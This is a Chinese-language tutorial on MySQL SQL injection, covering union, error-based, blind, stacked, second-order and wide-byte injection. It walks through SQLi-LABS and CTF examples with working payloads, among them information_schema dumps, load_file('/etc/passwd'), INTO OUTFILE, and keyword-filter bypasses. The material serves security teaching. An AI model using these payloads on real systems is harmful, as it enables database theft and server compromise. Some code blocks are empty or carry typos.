# SQL 注入漏洞

# SQL注入基础

## 数据库概述

数据库是结构化信息或数据的有组织的集合，通常由数据库管理系统（DBMS）来控制。

- SQL（**S**tructured **Q**uery **L**anguage，结构化查询语言）是一种特定目的程式语言，用于管理关系数据库管理系统
- **关系型数据库** - Oracle、MSSQL、**MySQL**、PostgreSQL、IBM DB2、Access 等
- **非关系型数据库（NoSQL数据库）** - **MongoDB**、Redis、Memcached 等
  - NoSQL 的本意是“Not Only SQL”，是传统关系型数据库的一个有效补充

## MySQL语法

关键词、函数、特性

- ORDER BY - 排序，超过字段数时报错。用于`确定字段数`
- UNION SELECT - 联合查询，前后两次查询，字段数相同
- LIMIT N,M - 从第 N 条记录开始，返回 M 条记录  `LIMIT M OFFSET N` `N`默认为`0`
- GROUP BY - 根据一个或多个列对结果集进行分组，可结合一些聚合函数来使用
- WHERE - 条件语句 `AND` `OR`
- 隐式类型转换 - 数字、字符串、HEX()、ASCII()
- MySQL 5.0 版本以上，自带数据库`information_schema`包含数据库结构信息
- 表名和字段名可以通过反引号`\``使用关键字

|   |   |
|---|---|
| user() | 当前数据库用户 |
| database() | 当前数据库名 |
| version() | 数据库版本 |
| CONCAT()、CONCAT_WS()、**GROUP_CONCAT()** |字符串拼接|

### 注释语法

- 行间注释
  - `--`  注意后面有空格
  - `#`
- 行内注释
  - `/*注释内容*/`
  - `/*! 注释内容*/`

### 文件操作

MySQL 支持读写文件，但与配置有关

```sql
# `空`无限制、指定目录、`NULL`禁止
SHOW VARIABLES LIKE "secure_file_priv";
```

- 文件的位置必须在服务器上，必须知道绝对路径，有`file`权限
- 文件可读取，文件大小小于`max_allow_packet`字节
- 如不满足条件，返回`NULL`

```sql
SELECT * from `tbl` into outfile '/tmp/test.txt';
SELECT load_file('/etc/passwd');
```

## SQL注入概述

SQL 注入是注入攻击的一种，攻击者可以执行恶意 SQL 语句。利用 SQL 注入漏洞，攻击者可以检索、添加、修改和删除数据库中的记录，甚至可以获取数据库服务器权限。

两个条件

- 用户能够控制输入
- 程序可以执行**拼接**了用户输入的 SQL 语句

危害

- 绕过登录验证 - 使用万能密码登录网站后台等
- 获取敏感数据 - 获取网站管理员账号、密码等
- 文件系统操作 - 列目录，读取、写入文件等
- 执行命令 - 远程执行系统命令、数据库命令

SQL 注入示意图

![](https://book.dropsec.xyz/assets/img/sql-injection.svg)

## SQL注入类型

![](/SQL注入类型.png)

## 联合查询注入（UNION query-based）

以 SQLi-LABS Less-1 为例

```sql
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
```

1. 判断是否存在注入点 -
尝试添加单引号`id=1'`，提示语法错误，说明可能存在注入漏洞。

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

产生语法错误的原因，SQL 语句多了单引号，无法正确闭合。

```sql
SELECT * FROM users WHERE id='1'' LIMIT 0,1;
```

2. 确定字段数
使用`ORDER BY`，二分法，得字段数为 3。

```
id=1' order by 4%23 //报错
id=1' order by 2%23，//正常
id=1' order by 3%23 //正常
```

1. 判断显示位

```
?id=-1' UNION SELECT 1,2,3%23
```

1. 获取数据（数据库名、表名、字段名）

数据库

```
?id=-1' union select 1,group_concat(schema_name),3+from+information_schema.schemata%23
```

表名

```
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema= database()%23
```

字段名

```
?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=database() AND table_name='users'%23
```

## 报错注入（error-based）

存在注入，且有错误信息显示，通过人为制造错误条件，使得结果出现在错误信息中

> `~`按位取反

- 数据溢出
  - EXP(_number_) 返回 e 的 x 次方
  - `!(select*from(select user())X)-~0`
- XPATH 语法错误
  - ExtractValue(_xml_frag_, _xpath_expr_) 查询
  - UpdateXML(_xml_target_, _xpath_expr_, _new_xml_) 修改
  
- 主键重复，count()和 group by 在遇到 rand()产生的重复值

```sql
select count(*) from information_schema.schemata group by concat((select user()),floor(rand(0)*2));
```

表中需要至少 3 条数据才能报错

## 盲注

存在注入，但没有回显和错误信息。盲注根据判断指标，分为`基于布尔的盲注`和`基于时间的盲注`。

- `SUBSTR(_string_, _start_, _lenth_)` - 字符串截取
- `ASCII(_character_)` - 返回字符的 ASCII 值

- `LENGTH(_string_)` - 返回字符串长度
- `if(条件,成立,不成立)`
- `SELECT IF(500<1000, "YES", "NO");`

### 基于布尔的盲注（boolean-based blind）

根据页面返回内容不同进行判断

```
?id=1' and 1=1#  页面返回正常
?id=1' and 1=2#  页面返回不正常
```

- 异或`^`(XOR) - 1^1=0 0^0=0

0^1=1 1^1^1=0 1^1^0=0   同为 0，异为 1

```
?id=1^(1=1)^1
?id=1^(ascii(mid(database(),1,1))=98)^1
```

### 基于时间的盲注（time-based blind）

根据页面响应时间判断

`if(ascii(substr(database(),1,1))>100,sleep(1),2=1)`

- `SLEEP(_n_)` - 睡眠 n 秒
- `BENCHMARK(_count_,_expr_)` - 计算`expr`表达式`count`次，用于测试函数或者表达式的执行速度，返回值都是 0，仅仅会执行显示时间
- `笛卡尔积` - 多表查询

```sql
SELECT count(*) FROM information_schema.columns A, information_schema.columns B
```

- `RLIKE` - 利用 SQL 多次计算正则消耗计算资源产生延时效果，通过`rpad`或`repeat`构造长字符串

```sql
SELECT RPAD('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
```

## 堆叠注入（Stacked Queries）

一次执行多条 SQL 语句，每条语句以`;`结尾。比如后端使用`mysqli_multi_query`函数。由于可以执行其他语句，堆叠注入的危害性更大。

```sql
# 列出数据库
SHOW {DATABASES | SCHEMAS};

# 列出表
SHOW TABLES;

# 查看表结构
SHOW COLUMNS from `tbl_name`;
DESC `tbl_name`;
DESCRIBE `tbl_name`;
```

## 二次（阶）注入（Double Order SQLi）

二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入

- [addslashes](https://www.php.net/manual/zh/function.addslashes.php)，仅仅是为了获取插入数据库的数据，**额外的`\`并不会插入**

例：SQLi-labs 第 24 关

## 经典赛题分析

## 练习题

简单

- [极客大挑战 2019]EasySQL
- Your secrets

中等

- [极客大挑战 2019]FinalSQL
- [SUCTF 2019]EasySQL

困难

- 网鼎杯 2018 comment

# SQL注入进阶

## MySQL 5.7特性

MySQL 5.7.9 新增`sys`数据库

```sql
SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();
SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();
SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`schema_table_statistics` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();
SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();
SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
SELECT FILE FROM `sys`.`x$io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();
SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();
SELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE();
```

## MySQL 8 特性

MySQL 8.0.19 之后，新增了`TABLE`、`VALUES`

- TABLE 语法 - 始终显示所有字段、不支持过滤，即 WHERE 子句

```sql
TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
```

- VALUE 语法 - 把一组一个或多个行作为表展示出来，返回的也是一个表数据

```sql
VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]

VALUES ROW(1, 2, 3) UNION SELECT * FROM users;
```

## 编码绕过

- to_base64，5.6 版本新增
- hex
- aes_encrypt
- des_encrypt

## 过滤空格

<div grid="~ cols-2 gap-4">
<div>

- 注释
  - /**/
  - /\*something\*/
  - /\*!\*/
- 括号 - `UNION(SELECT(column)FROM(tbl))`

</div>
<div>

- 其他字符

| | |
| ---------|----------|
 09 | Horizontal Tab |
 0A | New Line |
 0B | Vertical Tab |
 0C | New Page |
 0D | Carriage Return |
 A0 | Non-breaking Space |
 20 | Space |

</div>
</div>

## 过滤引号

- 十六进制

```sql
SELECT * FROM users WHERE username = 0x637466;
```
>
> - [由Three Hit聊聊二次注入](https://www.freebuf.com/articles/web/167089.html)
>
- `char()`函数

```sql
SELECT * FROM users WHERE username = CHAR(99, 116, 102);
```

## 过滤逗号

- 联表查询`JOIN`

```sql
-1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
```

- `LIMIT 1 OFFSET 0`
- `FROM x FOR y`
  - mid(user() from 1 for 1)
  - substr(user() from 1 for 1)
- `EXP`等数学运算函数

> 前提是有报错信息

```sql
select !(select*from(select user())x)-~0;
```

## 过滤字段名

过滤字段或无法知道字段名，通常可以进行连表查询和按位比较

```sql
select x.3 from (select * from (select 1)a JOIN (select 2)b JOIN (select 3)c union(select * from users))x;
```

如果表中只有 1 个字段，`SUBSTR((SELECT * FROM users LIMIT 1),1,1)='x'`
如果有多个字段，需要字段数相等

```sql
SELECT (SELECT 1,2,3) > (SELECT * FROM users LMIT 1);
```

MySQL 默认不区分大小写，可以使用二进制字符串进行比较
`SELECT CONCAT("A", CAST(0 AS JSON))`

## 过滤关键字

<div grid="~ cols-2 gap-4">
<div>

等价

- `AND`、`&&`
- `OR`、`||`
- `=`、`LIKE`、`GREATEST()`,[更多比较操作符](https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html)

</div>
<div>

- `/union\s+select/i`
  - UNION(SELECT)
  - UNION [ALL|DISTINCT] SELECT
  - UNION/\*!SELECT\*/
  - UNION/**/SELECT
  - UNION%A0SELECT
- `/union/i`  - 转化为盲注
- `/select/i` - 往往和堆叠注入有联系
- `preg_replace('[\s]',"",$id))`  删除关键字
  - `SELESELECTCT`，叠字绕过

</div>
</div>

## 宽字节注入

在开启转义后，由于数据库编码和 PHP 编码不同，产生注入

- [addslashes](https://www.php.net/manual/zh/function.addslashes.php)为了数据库查询语句等的需要在某些字符前加上了反斜线转义，单引号（'）、双引号（"）、反斜线（\）与 NUL（null 字符）

0x <u>5c</u> -> `\`

$id = 0x <u>bf</u> <u>27</u>

addslashes($id)   -> 0x <u>bf 5c</u> 27  -> `縗'`

> GBK采用双字节编码，编码范围8140-FEFE

## 堆叠注入

存在堆叠注入，且过滤`select`

```sql
// 修改表名
RENAME TABLE `tbl_name` TO `new_tbl_name`;
ALTER TABLE `tbl_name` RENAME TO `new_tbl_name`;

// 修改字段名
ALTER TABLE `tbl_name` CHANGE `col_name` `new_col_name` 字段类型;
```

预编译语句

```sql
set @sql=concat("sel","ect flag from `tbl_name`");
PREPARE x from @sql;
EXECUTE x;
```

handler

```sql
```

## 练习题

- GYCTF2020 Ezsqli
- 网鼎杯 2018 unfinish

## 经典赛题分析

### 强网杯_2019_随便注

堆叠注入

1. 单引号、有错误信息提示、字段数为 2
2. 过滤`preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`
3. 过滤`select`，考虑堆叠注入

方法 1:预编译

```sql
SET @sql=concat("se","lect flag from `1919810931114514`");PREPARE x FROM @sql;EXECUTE x;
```

方法 2:修改表名、字段名

```sql
RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100);
```

方法 3:`handler`，见

```sql

```

> i春秋2020新春公益赛第二天blacklist，采用第三种方法

<!-OOB,oeder by 注入，false 注入，like 注入 mysql 特性-->